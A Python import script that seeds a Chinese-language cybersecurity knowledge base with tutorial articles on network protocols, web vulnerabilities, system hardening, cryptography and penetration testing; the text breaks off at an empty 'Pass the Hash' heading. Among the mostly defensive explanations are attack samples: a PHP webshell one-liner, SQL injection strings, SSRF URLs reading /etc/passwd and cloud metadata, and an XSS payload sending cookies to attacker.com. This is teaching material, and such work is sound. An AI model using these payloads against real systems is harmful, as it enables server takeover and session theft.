"""
网络安全知识库数据导入脚本 - 完整版
运行方式: python import_knowledge_full.py
"""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app import create_app, db
from app.models.knowledge import Category, KnowledgeItem, KnowledgeTag
from app.models.user import User

# ============================================
# 完整网络安全知识数据
# ============================================
CATEGORIES_AND_ITEMS = {
    # ============================================
    # 分类1：网络安全基础
    # ============================================
    "网络安全基础": {
        "description": "计算机网络基础知识，包括协议、安全原理等",
        "items": [
            {
                "title": "TCP/IP协议体系结构",
                "summary": "介绍TCP/IP四层模型及各层主要协议",
                "content": """# TCP/IP协议体系结构

## 四层模型

TCP/IP协议栈采用四层结构，从下往上依次是：

### 1. 链路层（Link Layer）
负责在物理网络上传输数据帧，包括：
- **ARP协议**：地址解析协议，将IP地址转换为MAC地址
- **RARP协议**：反向地址解析协议
- **以太网**：最常见的局域网技术

### 2. 网络层（Internet Layer）
负责IP地址寻址和路由：
- **IP协议**：核心协议，分为IPv4和IPv6
- **ICMP协议**：互联网控制消息协议，用于诊断和报错
- **IGMP协议**：组播协议

### 3. 传输层（Transport Layer）
提供端到端的通信服务：
- **TCP协议**：面向连接、可靠传输、流量控制
- **UDP协议**：无连接、高效传输、低延迟

### 4. 应用层（Application Layer）
为用户提供网络服务：
- **HTTP/HTTPS**：Web访问
- **DNS**：域名解析
- **SMTP/POP3/IMAP**：电子邮件
- **FTP**：文件传输

## 安全相关知识点

### TCP三次握手与SYN Flood攻击
1. 客户端发送SYN包
2. 服务器返回SYN-ACK包
3. 客户端发送ACK包完成连接

**SYN Flood攻击原理**：攻击者发送大量SYN包但不完成三次握手，导致服务器半开连接耗尽资源。

### DNS安全
- **DNS欺骗**：攻击者伪造DNS响应
- **DNS隧道**：利用DNS协议传输隐蔽数据
- **防护措施**：使用DNSSEC、配置DNS解析安全策略""",
                "difficulty": "easy",
                "source": "网络安全基础知识整理",
                "tags": ["TCP/IP", "协议", "网络层"]
            },
            {
                "title": "DNS协议工作原理与安全",
                "summary": "DNS解析过程、常见攻击方式及防护措施",
                "content": """# DNS协议工作原理与安全

## DNS系统概述

DNS（Domain Name System）是互联网的核心服务，用于将域名解析为IP地址。

## DNS查询过程

### 递归查询
客户端发起域名解析请求给本地DNS服务器，本地DNS服务器负责完整查询过程并返回最终结果。

### 迭代查询
DNS服务器之间采用迭代查询，当本地DNS没有缓存时，会依次查询根域名服务器、顶级域名服务器、权威域名服务器。

## 常见DNS攻击

### 1. DNS缓存投毒
攻击者向DNS服务器发送伪造的响应，污染DNS缓存，使用户访问恶意站点。

### 2. DNS欺骗
中间人攻击的一种，拦截DNS查询并返回伪造的IP地址。

### 3. DNS隧道
利用DNS协议传输数据，绕过网络防火墙。攻击者可以通过DNS查询请求传输恶意代码或数据。

### 4. DDoS攻击
对DNS服务器发起分布式拒绝服务攻击，导致DNS服务不可用。

## 防护措施

1. **启用DNSSEC**：为DNS响应添加数字签名验证
2. **限制递归查询**：只对内部网络提供递归服务
3. **使用可信的DNS服务器**：如8.8.8.8、1.1.1.1
4. **监控DNS日志**：及时发现异常查询行为
5. **部署DNS防火墙**：过滤恶意域名和查询""",
                "difficulty": "medium",
                "source": "DNS安全分析",
                "tags": ["DNS", "协议", "网络安全"]
            },
            {
                "title": "HTTP/HTTPS协议详解",
                "summary": "HTTP协议工作原理及HTTPS安全机制",
                "content": """# HTTP/HTTPS协议详解

## HTTP协议

### HTTP工作原理
HTTP（HyperText Transfer Protocol）是无状态的请求-响应协议。

### HTTP请求方法
| 方法 | 说明 | 安全性 |
|------|------|--------|
| GET | 获取资源 | 低 |
| POST | 提交数据 | 中 |
| PUT | 上传资源 | 低 |
| DELETE | 删除资源 | 低 |
| HEAD | 获取头部 | 低 |

### HTTP状态码
- **1xx**：信息响应
- **2xx**：成功（200 OK）
- **3xx**：重定向（301、302）
- **4xx**：客户端错误（404、403）
- **5xx**：服务器错误（500、502）

## HTTPS安全机制

### SSL/TLS握手过程
1. 客户端发送支持的加密算法列表
2. 服务器选择算法并发送证书
3. 客户端验证证书有效性
4. 双方生成会话密钥
5. 加密通信开始

### HTTPS优势
- **加密传输**：防止中间人窃听
- **身份认证**：验证服务器身份
- **数据完整性**：防止数据篡改

### 常见HTTPS安全问题
1. **心脏滴血漏洞**：OpenSSL心跳扩展实现缺陷
2. **SSL Strip攻击**：将HTTPS降级为HTTP
3. **证书伪造**：使用自签名或伪造证书
4. **弱加密算法**：使用已破解的加密算法

## 安全建议
- 强制使用HTTPS
- 配置HSTS（HTTP严格传输安全）
- 禁用SSLv2/v3和TLS1.0
- 使用强加密套件""",
                "difficulty": "medium",
                "source": "Web安全基础",
                "tags": ["HTTP", "HTTPS", "TLS", "SSL"]
            },
            {
                "title": "ARP协议与ARP欺骗攻击",
                "summary": "ARP协议工作原理及ARP欺骗防御",
                "content": """# ARP协议与ARP欺骗攻击

## ARP协议原理

ARP（Address Resolution Protocol）用于将IP地址解析为MAC地址。

### ARP工作流程
1. 主机查询目标IP的MAC地址
2. 广播ARP请求包
3. 目标主机响应ARP reply
4. 主机缓存IP-MAC对应关系

## ARP欺骗攻击

### 攻击原理
攻击者发送伪造的ARP响应包，将自己的MAC地址绑定到受害者的IP地址。

### 中间人攻击
攻击者同时欺骗网关和目标主机，使得双向流量都经过攻击者。

### 攻击工具
- **arpwatch**：监控ARP变化
- **ettercap**：ARP欺骗工具
- **dsniff**：网络嗅探工具包

## 防御措施

1. **静态ARP表**：手动绑定关键IP-MAC
2. **ARP防火墙**：检测和阻止异常ARP包
3. **交换机的Dynamic ARP Inspection**：验证ARP包
4. **802.1X认证**：端口接入控制
5. **加密通信**：使用VPN或TLS""",
                "difficulty": "medium",
                "source": "网络安全",
                "tags": ["ARP", "中间人攻击", "网络安全"]
            },
            {
                "title": "DHCP协议与DHCP攻击",
                "summary": "DHCP工作原理及安全威胁",
                "content": """# DHCP协议与DHCP攻击

## DHCP工作原理

DHCP（Dynamic Host Configuration Protocol）动态分配IP地址。

### 四步获取过程（DORA）
1. **Discover**：客户端广播发现包
2. **Offer**：服务器提供IP地址
3. **Request**：客户端请求IP
4. **Ack**：服务器确认

## DHCP攻击

### 1. DHCP欺骗
攻击者部署恶意DHCP服务器，提供错误配置：
- 虚假网关 → 流量导向攻击者
- 虚假DNS服务器 → 钓鱼攻击

### 2. DHCP饥饿攻击
攻击者发送大量DHCP请求耗尽地址池。

## 防御措施

1. **DHCP Snooping**：交换机启用，信任端口白名单
2. **ARP检测**：配合动态ARP检测
3. **端口安全**：限制每个端口的MAC数
4. **监控**：部署DHCP监听服务器""",
                "difficulty": "easy",
                "source": "网络安全",
                "tags": ["DHCP", "网络安全", "协议"]
            },
            {
                "title": "VPN技术与安全",
                "summary": "VPN原理、类型及安全考虑",
                "content": """# VPN技术与安全

## VPN原理

VPN（Virtual Private Network）通过公网建立加密隧道，实现安全通信。

## VPN类型

### 1. 远程访问VPN
个人用户连接企业网络
- SSL VPN（WebVPN）
- PPTP VPN
- L2TP/IPSec VPN

### 2. 站点到站点VPN
连接两个局域网
- IPSec VPN
- GRE隧道
- MPLS VPN

## 常用VPN协议

### IPSec
- 加密：ESP（Encapsulating Security Payload）
- 认证：AH（Authentication Header）
- 密钥交换：IKEv1/IKEv2

### SSL/TLS VPN
- 基于浏览器
- 适合远程办公
- 配置简单

## 安全建议

1. **强密码策略**：复杂的预共享密钥
2. **双因素认证**：结合证书+密码
3. **定期更新密钥**：避免长期使用同一密钥
4. **日志审计**：记录VPN访问行为
5. **流量加密**：使用强加密算法（AES-256）""",
                "difficulty": "medium",
                "source": "网络安全",
                "tags": ["VPN", "隧道", "加密"]
            },
            {
                "title": "无线网络WiFi安全",
                "summary": "WiFi加密协议与安全防护",
                "content": """# 无线网络WiFi安全

## WiFi加密协议

### WEP（Wired Equivalent Privacy）
- 已被完全破解
- RC4加密，40/104位密钥
- 不应再使用

### WPA（WiFi Protected Access）
- 过渡性协议
- TKIP加密
- 仍有安全漏洞

### WPA2
- 当前主流
- AES-CCMP加密
- 2017年被KRACK攻击破解

### WPA3
- 最新标准
- SAE握手协议
- 防暴力破解

## 常见WiFi攻击

### 1. WEP破解
- FMS攻击、 chopchop攻击
- 利用IV（初始向量）弱点

### 2. WPA/WPA2破解
- 字典攻击PSK
- 离线破解握手包

### 3. 恶意热点（Evil Twin）
- 创建同名伪造热点
- 中间人监听流量

### 4. KRACK攻击
- 密钥重装攻击
- 攻击WPA2四次握手

## 安全建议

1. **使用WPA3或强WPA2**
2. **设置复杂WiFi密码**
3. **隐藏SSID广播**
4. **MAC地址过滤**
5. **企业级802.1X认证**
6. **定期更换密码**
7. **分离访客网络**""",
                "difficulty": "medium",
                "source": "无线安全",
                "tags": ["WiFi", "WPA", "无线安全"]
            }
        ]
    },

    # ============================================
    # 分类2：Web 安全
    # ============================================
    "Web 安全": {
        "description": "Web应用安全漏洞原理与防御",
        "items": [
            {
                "title": "SQL注入漏洞原理与防御",
                "summary": "SQL注入攻击原理、类型及防护方法",
                "content": """# SQL注入漏洞原理与防御

## 漏洞原理

SQL注入（SQL Injection）是由于Web应用程序对用户输入未做充分验证和转义，导致攻击者可以在SQL语句中插入恶意代码。

## 攻击原理示例

### 正常查询
```sql
SELECT * FROM users WHERE username='admin' AND password='123456'
```

### 注入后
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```
`'--` 将后面的密码验证注释掉，攻击者无需密码即可登录。

## SQL注入类型

### 1. 基于错误的注入
通过构造特殊输入引发数据库错误，从错误信息中获取数据库结构。

### 2. 联合查询注入
使用UNION语句合并恶意查询结果。
```sql
SELECT name,email FROM users UNION SELECT username,password FROM admin_users--
```

### 3. 布尔盲注
根据页面返回真假判断信息。

### 4. 时间盲注
利用数据库延时函数判断条件。

### 5. 堆叠查询
执行多条SQL语句。

## 防御措施

### 1. 参数化查询（最佳方案）
```python
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

### 2. 输入验证
- 白名单验证
- 类型检查
- 长度限制

### 3. 转义处理
对特殊字符进行转义

### 4. 最小权限原则
数据库账户只授予必要的权限

### 5. 错误处理
生产环境关闭详细错误信息""",
                "difficulty": "medium",
                "source": "OWASP Top 10",
                "tags": ["SQL注入", "Web安全", "OWASP"]
            },
            {
                "title": "XSS跨站脚本攻击详解",
                "summary": "XSS攻击类型、原理及防护策略",
                "content": """# XSS跨站脚本攻击详解

## 漏洞原理

XSS（Cross-Site Scripting）攻击是指攻击者通过在网页中注入恶意JavaScript代码，当其他用户浏览该网页时，恶意代码会在用户浏览器中执行。

## XSS攻击类型

### 1. 反射型XSS
恶意脚本作为用户输入的一部分被服务器接收，然后未经转义地返回给用户。

### 2. 存储型XSS
恶意脚本被永久存储在目标服务器（如数据库、评论、论坛帖子），所有访问该数据的用户都会被攻击。

### 3. DOM型XSS
不涉及服务器处理，纯客户端漏洞。恶意脚本通过操作DOM对象来执行。

## XSS攻击危害

1. **窃取Cookie/Session**：获取用户认证信息
2. **键盘记录**：监听用户键盘输入
3. **钓鱼攻击**：修改页面内容欺骗用户
4. **植入恶意软件**：下载并执行恶意程序
5. **蠕虫传播**：自动传播XSS攻击

## 防御措施

### 1. 输入验证
- 白名单验证
- 限制输入长度
- 过滤特殊字符

### 2. 输出编码
| 上下文 | 编码方式 |
|--------|----------|
| HTML内容 | `&lt;` `&gt;` `&amp;` |
| HTML属性 | 使用双引号包裹 |
| JavaScript | JSON编码 |

### 3. 设置安全头部
```http
Content-Security-Policy: script-src 'self'
```

### 4. HttpOnly Cookie
```http
Set-Cookie: session=xxx; HttpOnly
```""",
                "difficulty": "medium",
                "source": "Web应用安全",
                "tags": ["XSS", "跨站脚本", "Web安全"]
            },
            {
                "title": "CSRF跨站请求伪造",
                "summary": "CSRF攻击原理与防护方法",
                "content": """# CSRF跨站请求伪造

## 漏洞原理

CSRF（Cross-Site Request Forgery）攻击者利用用户已登录的身份，诱导用户访问恶意页面，在用户不知情的情况下以用户身份执行非自愿的操作。

## 攻击示例

```html
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

## 防御措施

### 1. CSRF Token（最佳方案）
服务器生成随机Token，在表单和Session中各存储一份。

### 2. 验证请求来源
检查HTTP头中的Referer或Origin字段。

### 3. SameSite Cookie
```http
Set-Cookie: session=xxx; SameSite=Strict
```

### 4. 双重提交Cookie
将Token同时放在Cookie和请求参数中""",
                "difficulty": "medium",
                "source": "Web安全实践",
                "tags": ["CSRF", "Web安全", "会话安全"]
            },
            {
                "title": "SSRF服务器端请求伪造",
                "summary": "SSRF漏洞原理、攻击方式及防御",
                "content": """# SSRF服务器端请求伪造

## 漏洞原理

SSRF（Server-Side Request Forgery）攻击者利用Web应用程序的服务器作为代理，向内部系统或外部系统发起请求，从而突破网络边界限制。

## 攻击场景

### 1. 访问内部系统
```
http://example.com/fetch?url=http://192.168.1.100/admin
```

### 2. 读取本地文件
```
http://example.com/fetch?url=file:///etc/passwd
```

### 3. 攻击云服务元数据
```
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

## 防御措施

### 1. URL验证
- 检查host是否为内网IP
- 禁止访问私有IP地址段

### 2. 协议限制
- 限制允许的协议（http/https）
- 禁止file://、dict://、gopher://等

### 3. 白名单
只允许访问预定义的URL列表""",
                "difficulty": "hard",
                "source": "API安全",
                "tags": ["SSRF", "Web安全", "服务器安全"]
            },
            {
                "title": "文件上传漏洞与防护",
                "summary": "文件上传漏洞原理及安全上传策略",
                "content": """# 文件上传漏洞与防护

## 漏洞原理

文件上传功能如果没有正确验证上传文件的类型和内容，攻击者可以上传恶意文件（如WebShell）并在服务器上执行。

## 攻击方式

### WebShell上传
```php
<?php system($_GET['cmd']); ?>
```

### 绕过验证
- 扩展名绕过：1.php.jpg
- 大小写绕过：1.PhP
- 00截断：1.php\\x00.jpg
- MIME类型欺骗

## 防御措施

### 1. 文件类型验证
```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
```

### 2. MIME类型验证
```python
if file.content_type not in ['image/png', 'image/jpeg']:
    abort(403)
```

### 3. 文件内容验证
验证文件头（如图片的魔数）

### 4. 存放策略
- 上传文件存储在Web根目录之外
- 使用随机文件名
- 上传目录禁止执行

### 5. 图片处理
对上传图片进行重新生成，破坏恶意代码""",
                "difficulty": "medium",
                "source": "Web应用安全",
                "tags": ["文件上传", "WebShell", "Web安全"]
            },
            {
                "title": "命令注入漏洞",
                "summary": "命令注入攻击原理与防御",
                "content": """# 命令注入漏洞

## 漏洞原理

应用程序调用系统命令时，未对用户输入进行充分过滤，导致攻击者可以注入额外命令。

## 危险函数

### PHP
```php
system($_GET['cmd']);
exec($_POST['cmd']);
shell_exec($_REQUEST['cmd']);
```

### Python
```python
os.system(user_input)
subprocess.call(user_input, shell=True)
```

### Java
```java
Runtime.getRuntime().exec(user_input);
```

## 防御措施

### 1. 避免使用系统命令
优先使用语言原生API而非调用系统命令。

### 2. 输入验证
白名单验证允许的命令和参数。

### 3. 参数化命令
使用数组形式传递参数，避免shell解析。

```python
# 不安全
subprocess.call(f"ls {user_dir}", shell=True)

# 安全
subprocess.call(["ls", user_dir])
```

### 4. 权限限制
以低权限用户运行Web服务。""",
                "difficulty": "hard",
                "source": "Web安全",
                "tags": ["命令注入", "Web安全", "代码审计"]
            },
            {
                "title": "JSONP安全与CORS配置",
                "summary": "JSONP劫持与跨域安全配置",
                "content": """# JSONP安全与CORS配置

## JSONP劫持

### 原理
JSONP通过<script>标签绕过同源策略获取数据，攻击者可构造恶意页面劫持数据。

### 攻击流程
1. 用户登录目标网站
2. 访问攻击者恶意页面
3. 页面通过JSONP获取用户敏感数据
4. 发送数据到攻击者服务器

## CORS（跨域资源共享）

### 敏感配置
```http
Access-Control-Allow-Origin: *
```
允许所有来源访问，非常危险！

### 安全配置
```http
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
```

## 防御措施

1. **避免使用JSONP**
2. **严格配置CORS白名单**
3. **验证请求来源**
4. **使用Token验证**
5. **敏感操作使用POST而非GET**""",
                "difficulty": "medium",
                "source": "Web安全",
                "tags": ["JSONP", "CORS", "跨域安全"]
            },
            {
                "title": "WebSocket安全",
                "summary": "WebSocket协议的安全问题与防护",
                "content": """# WebSocket安全

## WebSocket简介

WebSocket提供双向持久连接通信，常用于实时应用。

## 安全问题

### 1. 缺乏认证
WebSocket握手时不进行身份验证。

### 2. 同源策略绕过
WebSocket不受同源策略限制。

### 3. 跨站WebSocket劫持（CSWSH）
攻击者利用用户身份发起WebSocket连接。

## 防护措施

### 1. 验证Origin头
```javascript
const origin = request.headers.origin;
if (!allowedOrigins.includes(origin)) {
  reject();
}
```

### 2. 使用WSS（WebSocket Secure）
```javascript
const ws = new WebSocket('wss://secure.example.com');
```

### 3. 身份Token验证
在WebSocket消息中携带认证Token。

### 4. 消息级认证
每条消息包含签名或Token。

### 5. 输入验证
对所有接收的消息进行严格验证。""",
                "difficulty": "hard",
                "source": "Web安全",
                "tags": ["WebSocket", "实时通信", "安全"]
            }
        ]
    },

    # ============================================
    # 分类3：系统安全
    # ============================================
    "系统安全": {
        "description": "操作系统安全配置与加固",
        "items": [
            {
                "title": "Linux系统安全加固",
                "summary": "Linux系统安全加固的常用方法",
                "content": """# Linux系统安全加固

## 用户与权限管理

### 1. 最小权限原则
- 创建专用服务账户
- 禁止root直接登录
- 使用sudo提权

### 2. SSH安全配置
```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
```

## 文件系统安全

### 重要文件权限
```bash
chmod 600 /etc/shadow
chmod 644 /etc/passwd
chattr +i /etc/passwd
```

### 挂载选项
```bash
/dev/sda1 /boot ext4 defaults,nosuid,nodev,noexec 0 2
/dev/sda2 /tmp ext4 defaults,nosuid,nodev,noexec 0 2
```

## 服务与进程安全

### 禁用不必要的服务
```bash
systemctl disable telnet.socket
systemctl disable vsftpd
```

### 网络参数加固
```bash
# 防止IP欺骗
echo "1" > /proc/sys/net/ipv4/conf/all/rp_filter

# 开启SYN Cookie
echo "1" > /proc/sys/net/ipv4/tcp_syncookies
```

## 日志与审计

配置Auditd监控重要文件：
```bash
auditctl -w /etc/passwd -p wa -k identity
auditctl -w /etc/shadow -p wa -k identity
```""",
                "difficulty": "hard",
                "source": "Linux系统管理",
                "tags": ["Linux", "系统加固", "权限管理"]
            },
            {
                "title": "Windows系统安全加固",
                "summary": "Windows系统安全加固配置指南",
                "content": """# Windows系统安全加固

## 账户安全

### 管理员账户策略
- 重命名Administrator账户
- 设置强密码
- 创建陷阱管理员账户

### 密码策略
```
本地安全策略 → 账户策略 → 密码策略
- 密码长度最小值: 12
- 密码必须符合复杂性: 启用
- 密码最长使用时间: 90天
```

### 账户锁定策略
```
账户锁定阈值: 5次
账户锁定时间: 30分钟
```

## 服务安全

### 禁用不必要的服务
```powershell
sc config RemoteRegistry start= disabled
sc config TlntSvr start= disabled
```

## 网络安全

### 防火墙配置
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

### SMB安全
```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false
```""",
                "difficulty": "hard",
                "source": "Windows安全",
                "tags": ["Windows", "系统加固", "安全配置"]
            },
            {
                "title": "Docker容器安全",
                "summary": "Docker容器安全配置与最佳实践",
                "content": """# Docker容器安全

## 镜像安全

### 1. 最小化镜像
- 使用Alpine等轻量镜像
- 多阶段构建
- 移除不必要的工具

### 2. 镜像扫描
```bash
docker scan image_name
trivy image image_name
```

## 容器运行安全

### 1. 非root运行
```dockerfile
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
```

### 2. 资源限制
```bash
docker run --memory="256m" --cpus="0.5"
```

### 3. 安全选项
```bash
docker run --security-opt=no-new-privileges:true
docker run --read-only
```

## 网络安全

### 限制网络访问
```bash
docker network create --internal isolated_net
docker network connect isolated_net container
```

## 密钥管理

### 使用Docker Secrets
```bash
echo "password" | docker secret create db_password -
```

## 监控与审计

### 日志配置
```json
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  }
}
```""",
                "difficulty": "hard",
                "source": "容器安全",
                "tags": ["Docker", "容器", "安全加固"]
            },
            {
                "title": "Kubernetes安全",
                "summary": "K8s集群安全配置与防护",
                "content": """# Kubernetes安全

## Pod安全

### 1. 安全上下文
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  readOnlyRootFilesystem: true
```

### 2. 资源限制
```yaml
resources:
  limits:
    memory: "128Mi"
    cpu: "500m"
  requests:
    memory: "64Mi"
    cpu: "250m"
```

## 网络策略

###  默认拒绝
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
spec:
  podSelector: {}
```

## RBAC权限控制

### 最小权限原则
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
```

## 敏感信息保护

### 使用Secrets
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
stringData:
  password: password123
```

### 外部密钥管理
集成Vault、AWS Secrets Manager等外部密钥管理系统。

## 镜像安全

1. 定期扫描镜像漏洞
2. 使用私有镜像仓库
3. 签名镜像内容""",
                "difficulty": "hard",
                "source": "云原生安全",
                "tags": ["Kubernetes", "K8s", "容器", "云安全"]
            }
        ]
    },

    # ============================================
    # 分类4：密码学
    # ============================================
    "密码学": {
        "description": "密码学基础与安全应用",
        "items": [
            {
                "title": "对称加密与非对称加密",
                "summary": "两种加密体制的原理、区别与应用场景",
                "content": """# 对称加密与非对称加密

## 对称加密

### 原理
加密和解密使用相同的密钥。

### 常用算法

| 算法 | 密钥长度 | 安全性 |
|------|----------|--------|
| AES | 128/192/256位 | 高 |
| DES | 56位 | 低（已破解） |
| 3DES | 168位 | 中 |

### 优缺点
**优点**：速度快、资源消耗低
**缺点**：密钥分发困难

## 非对称加密

### 原理
使用公钥和私钥配对进行加密解密。

### 常用算法

| 算法 | 应用 |
|------|------|
| RSA | 密钥交换、数字签名 |
| ECC | 移动端加密 |
| DH | 密钥交换 |

### 优缺点
**优点**：密钥分发方便、支持数字签名
**缺点**：速度慢

## 混合加密

1. 使用非对称加密传输对称密钥
2. 使用对称加密加密实际数据""",
                "difficulty": "medium",
                "source": "密码学基础",
                "tags": ["加密", "AES", "RSA", "密码学"]
            },
            {
                "title": "哈希算法与消息认证",
                "summary": "哈希函数原理及HMAC消息认证",
                "content": """# 哈希算法与消息认证

## 哈希函数特性

1. **单向性**：无法从哈希值反推原始数据
2. **抗碰撞性**：无法找到相同哈希值的不同输入
3. **固定输出**：无论输入多长，输出长度固定
4. **雪崩效应**：输入微小变化导致输出巨大差异

## 常用哈希算法

| 算法 | 输出长度 | 安全性 |
|------|----------|--------|
| MD5 | 128位 | 不安全 |
| SHA-1 | 160位 | 不安全 |
| SHA-256 | 256位 | 安全 |
| SHA-3 | 可变 | 安全 |

## 密码存储

### 不安全的方式
```python
# 错误：明文或简单哈希存储
password_hash = md5(password)
```

### 正确的方式：加盐哈希
```python
import bcrypt

def hash_password(password):
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)
```

## HMAC

在哈希基础上增加密钥，防止消息被篡改。
```python
import hmac
mac = hmac.new(key, message, hashlib.sha256).hexdigest()
```""",
                "difficulty": "medium",
                "source": "密码学应用",
                "tags": ["哈希", "MD5", "SHA", "HMAC"]
            },
            {
                "title": "数字签名与数字证书",
                "summary": "数字签名原理及PKI证书体系",
                "content": """# 数字签名与数字证书

## 数字签名

### 原理
使用私钥对消息哈希值进行加密，生成签名。

### 常用算法
- **RSA签名**
- **DSA**：数字签名算法
- **ECDSA**：椭圆曲线数字签名算法

## X.509证书结构

```
证书内容：
- 版本号
- 序列号
- 签名算法
- 颁发者信息
- 有效期
- 主体信息（持有者）
- 公钥信息
- 扩展信息
- 签名值
```

## 证书颁发机构（CA）

1. **根CA**：自签名，信任起点
2. **中间CA**：由根CA签发
3. **终端实体**：服务器/用户证书

## 自签名证书

```bash
# 创建私钥和证书
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
```""",
                "difficulty": "hard",
                "source": "PKI体系",
                "tags": ["数字签名", "证书", "CA", "PKI"]
            },
            {
                "title": "TLS/SSL证书安全",
                "summary": "TLS协议工作原理与证书配置",
                "content": """# TLS/SSL证书安全

## TLS握手过程

1. 客户端发送支持的加密算法列表
2. 服务器选择算法并发送证书
3. 客户端验证证书有效性
4. 双方生成会话密钥
5. 加密通信开始

## TLS版本安全

| 版本 | 状态 |
|------|------|
| SSLv2 | 禁用（不安全） |
| SSLv3 | 禁用（POODLE攻击） |
| TLS1.0 | 禁用（脆弱） |
| TLS1.1 | 禁用 |
| TLS1.2 | 推奨 |
| TLS1.3 | 最新，最安全 |

## 证书配置检查

```bash
# 检查证书信息
openssl s_client -connect example.com:443

# 检查支持的密码套件
openssl s_client -connect example.com:443 -cipher '!NULL'
```

## 安全配置

### Nginx配置
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers on;
ssl_session_cache shared:SSL:10m;
```""",
                "difficulty": "medium",
                "source": "Web安全",
                "tags": ["TLS", "SSL", "证书", "加密"]
            },
            {
                "title": "JWT安全",
                "summary": "JSON Web Token的安全问题与最佳实践",
                "content": """# JWT安全

## JWT结构

JWT由三部分组成：Header.Payload.Signature

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ._signature
```

## 安全问题

### 1. 算法None
攻击者将alg改为none，删除签名。

### 2. 密钥混淆（Key Confusion）
将算法从RS256改为HS256，使用公钥作为对称密钥验证。

### 3. 敏感信息泄露
在Payload中存储敏感信息（Base64可解密）。

## 安全最佳实践

### 1. 验证算法
```javascript
if (token.header.alg !== 'RS256') {
  return reject('Invalid algorithm');
}
```

### 2. 验证签名
使用服务器私钥验证签名。

### 3. 设置过期时间
```javascript
const token = jwt.sign(
  { userId: user.id },
  privateKey,
  { expiresIn: '1h' }
);
```

### 4. 存储安全
- HttpOnly Cookie存储
- 不要存储在LocalStorage
- 配合CSRF保护""",
                "difficulty": "medium",
                "source": "身份认证",
                "tags": ["JWT", "Token", "身份认证"]
            }
        ]
    },

    # ============================================
    # 分类5：渗透测试
    # ============================================
    "渗透测试": {
        "description": "渗透测试方法论与常用工具",
        "items": [
            {
                "title": "信息收集技术",
                "summary": "渗透测试前的侦察与信息收集方法",
                "content": """# 信息收集技术

## 被动信息收集

### 1. 域名信息收集
```bash
whois example.com
dig +short example.com A
amass enum -passive -d example.com
```

### 2. 技术指纹
```bash
whatweb -v example.com
curl -I https://example.com
```

### 3. 网络空间搜索
- **Shodan**：网络空间搜索引擎
- **Censys**：证书和主机搜索
- **FOFA**：国内网络空间测绘

## 主动信息收集

### 端口扫描
```bash
nmap -sV -sC -O -p- 1.2.3.4
nmap -F 1.2.3.4
```

### Web目录扫描
```bash
gobuster dir -u https://example.com -w wordlist.txt
ffuf -w wordlist.txt -u https://example.com/FUZZ
```

## 收集信息清单

- [ ] 域名和子域名
- [ ] IP地址范围
- [ ] DNS记录
- [ ] 技术栈
- [ ] 公开漏洞信息""",
                "difficulty": "medium",
                "source": "渗透测试指南",
                "tags": ["信息收集", "侦察", "nmap", "渗透测试"]
            },
            {
                "title": "Web漏洞利用与防御",
                "summary": "常见Web漏洞的利用技术和防护方法",
                "content": """# Web漏洞利用与防御

## OWASP Top 10 (2021)

1. 访问控制失效
2. 加密失败
3. 注入
4. 不安全设计
5. 安全配置错误
6. 使用已知漏洞组件
7. 身份认证失效
8. 软件和数据完整性失败
9. 日志和监控不足
10. 服务端请求伪造

## SQL注入利用

```bash
# 手动测试
' OR '1'='1
' UNION SELECT NULL--

# sqlmap自动利用
sqlmap -u "http://target.com/product?id=1" --batch --dbs
```

## XSS利用

```html
<script>alert(document.cookie)</script>
<script>
fetch('http://attacker.com/steal?c=' + document.cookie)
</script>
```

## 漏洞扫描工具

| 工具 | 特点 |
|------|------|
| Burp Suite | Web渗透测试平台 |
| OWASP ZAP | 开源Web扫描器 |
| SQLMap | SQL注入检测 |
| XSStrike | XSS检测 |""",
                "difficulty": "hard",
                "source": "Web渗透测试",
                "tags": ["渗透测试", "漏洞利用", "OWASP"]
            },
            {
                "title": "缓冲区溢出漏洞",
                "summary": "缓冲区溢出原理、利用与防护",
                "content": """# 缓冲区溢出漏洞

## 原理

缓冲区溢出是指程序向缓冲区写入的数据超过了其容量，导致相邻内存被覆盖。

## 利用技术

### 栈溢出（Stack Overflow）
覆盖返回地址，控制程序执行流。

### 堆溢出（Heap Overflow）
堆管理结构损坏，控制malloc/free。

### 格式化字符串
```c
printf(user_input);  // %s%s%s泄露栈内容
```

## 防护措施

### 1. 编译器保护
```bash
gcc -fstack-protector - Canary值
gcc -PIE -fpie
```

### 2. ASLR
```bash
echo 2 > /proc/sys/kernel/randomize_va_space
```

### 3. NX/DEP
硬件层面禁止栈/堆执行代码。

### 4. 安全函数
```c
// 不安全
strcpy(dst, src);

// 安全替代
strncpy(dst, src, size);
```""",
                "difficulty": "hard",
                "source": "二进制漏洞",
                "tags": ["缓冲区溢出", "漏洞挖掘", "PWN"]
            },
            {
                "title": "内网渗透技术",
                "summary": "内网横向移动与权限维持",
                "content": """# 内网渗透技术

## 横向移动

### 1. Pass the Hash
